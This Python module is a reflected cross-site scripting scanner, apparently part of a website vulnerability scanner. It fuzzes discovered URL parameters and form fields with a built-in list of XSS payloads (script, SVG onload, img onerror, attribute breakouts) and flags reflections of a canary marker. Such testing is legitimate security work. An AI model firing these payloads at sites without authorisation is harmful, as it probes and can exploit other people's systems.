import requests
import logging
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote

logger = logging.getLogger(__name__)

# Unique canary marker embedded in all payloads
MARKER = "xss7t3st"

# ─── XSS Payload Library ──────────────────────────────────────────────────────
# Each payload embeds MARKER so we can detect partial reflections
XSS_PAYLOADS = [
    # Classic script injection
    f'<script>alert("{MARKER}")</script>',
    # Attribute break-out
    f'"><script>alert("{MARKER}")</script>',
    f"'><script>alert('{MARKER}')</script>",
    # SVG-based (bypasses some filters)
    f'"><svg/onload=alert("{MARKER}")>',
    f"'><svg onload=alert('{MARKER}')>",
    # Img onerror
    f'"><img src=x onerror=alert("{MARKER}")>',
    # JS URL context
    f'javascript:alert("{MARKER}")',
    # Event handler injection (attribute context)
    f'" onmouseover="alert(\'{MARKER}\')" x="',
    f"' onmouseover='alert(\"{MARKER}\")' x='",
    # Template literal / backtick bypass
    f"`><script>alert(`{MARKER}`)</script>",
]

# Input types that are worth testing for XSS
TESTABLE_INPUT_TYPES = {"text", "search", "email", "url", "textarea", "select", "number", "tel", "password"}

# Input types to skip entirely
SKIP_INPUT_TYPES = {"submit", "button", "image", "reset", "file", "checkbox", "radio", "hidden"}


def _detect_reflection(response_text: str, payload: str) -> tuple:
    """
    Detects XSS reflection in response.
    Returns (is_reflected: bool, reflection_type: str)
    
    Checks:
    1. Full payload reflected (direct reflection)
    2. MARKER reflected alone (partial / encoded payload but marker leaked)
    3. URL-encoded payload reflected
    """
    # Check 1: Full payload in response
    if payload in response_text:
        return True, "Full payload reflected unencoded"

    # Check 2: Just the canary marker reflected (even if payload is partially encoded)
    if MARKER in response_text:
        return True, f"Canary marker '{MARKER}' reflected in response (partial reflection)"

    # Check 3: URL-encoded version of marker
    encoded_marker = quote(MARKER)
    if encoded_marker in response_text:
        return True, "URL-encoded canary marker reflected"

    # Check 4: HTML entity encoded marker (e.g. x&#115;&#115;)
    # Simple check for split marker
    if "xss" in response_text.lower() and "7t3st" in response_text.lower():
        return True, "Split canary marker detected in response"

    return False, ""


def _build_form_data(inputs: list, target_name: str, payload: str) -> dict:
    """Build realistic form data, injecting payload only into the target field."""
    data = {}
    for inp in inputs:
        name = inp.get("name")
        if not name:
            continue
        inp_type = (inp.get("type") or "text").lower()
        if name == target_name:
            data[name] = payload
        elif inp_type == "email":
            data[name] = "test@example.com"
        elif inp_type == "password":
            data[name] = "TestPass123!"
        elif inp_type in ("checkbox", "radio"):
            data[name] = "on"
        elif inp_type == "select":
            data[name] = inp.get("value", "1")
        else:
            data[name] = inp.get("value") or "test"
    return data


def run_xss_scan(crawl_results: dict) -> dict:
    findings = []
    logs = []
    tested_combos = set()

    logs.append("[INFO] Initializing Reflected XSS Vulnerability Scanner...")

    forms = crawl_results.get("forms", [])
    discovered_links = crawl_results.get("discovered_links", [])

    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (compatible; WebsiteVulnerabilityScanner/2.0)"
    })

    # ── 1. Test URL Query Parameters ─────────────────────────────────────────
    for link in discovered_links:
        parsed = urlparse(link)
        if not parsed.query:
            continue

        params = parse_qs(parsed.query)
        base_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, "", ""))

        for param in params:
            combo_key = (base_url, param)
            if combo_key in tested_combos:
                continue
            tested_combos.add(combo_key)

            for payload in XSS_PAYLOADS:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param] = payload
                test_query = urlencode(test_params)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, test_query, ""))

                try:
                    res = session.get(test_url, timeout=8, verify=False)
                    is_reflected, reflection_type = _detect_reflection(res.text, payload)
                    if is_reflected:
                        finding = {
                            "type": "Reflected XSS",
                            "severity": "HIGH",
                            "url": link,
                            "parameter": param,
                            "payload": payload,
                            "reflection_type": reflection_type,
                            "description": f"Reflected XSS via URL parameter '{param}'. {reflection_type}."
                        }
                        findings.append(finding)
                        logs.append(f"[WARN] Reflected XSS on {link} (Param: {param}) — {reflection_type}")
                        break  # One finding per param is sufficient
                except Exception as e:
                    logs.append(f"[DEBUG] XSS URL test error on {test_url}: {str(e)}")

    # ── 2. Test Form Inputs ───────────────────────────────────────────────────
    for form in forms:
        action = form.get("action")
        method = form.get("method", "GET").upper()
        inputs = form.get("inputs", [])

        if not action:
            continue

        for inp in inputs:
            inp_name = inp.get("name")
            inp_type = (inp.get("type") or "text").lower()

            if not inp_name:
                continue
            if inp_type in SKIP_INPUT_TYPES:
                continue

            combo_key = (action, inp_name)
            if combo_key in tested_combos:
                continue
            tested_combos.add(combo_key)

            for payload in XSS_PAYLOADS:
                data = _build_form_data(inputs, inp_name, payload)

                try:
                    if method == "POST":
                        res = session.post(action, data=data, timeout=8, verify=False)
                    else:
                        res = session.get(action, params=data, timeout=8, verify=False)

                    is_reflected, reflection_type = _detect_reflection(res.text, payload)
                    if is_reflected:
                        finding = {
                            "type": "Reflected XSS",
                            "severity": "HIGH",
                            "url": action,
                            "parameter": inp_name,
                            "payload": payload,
                            "reflection_type": reflection_type,
                            "description": f"Reflected XSS via form input '{inp_name}' at {action}. {reflection_type}."
                        }
                        findings.append(finding)
                        logs.append(f"[WARN] Reflected XSS in form at {action} (Input: {inp_name}) — {reflection_type}")
                        break  # One finding per input is sufficient
                except Exception as e:
                    logs.append(f"[DEBUG] XSS form test error on {action}: {str(e)}")

    logs.append(f"[INFO] Reflected XSS Scan complete. {len(findings)} findings detected.")
    return {"findings": findings, "logs": logs}
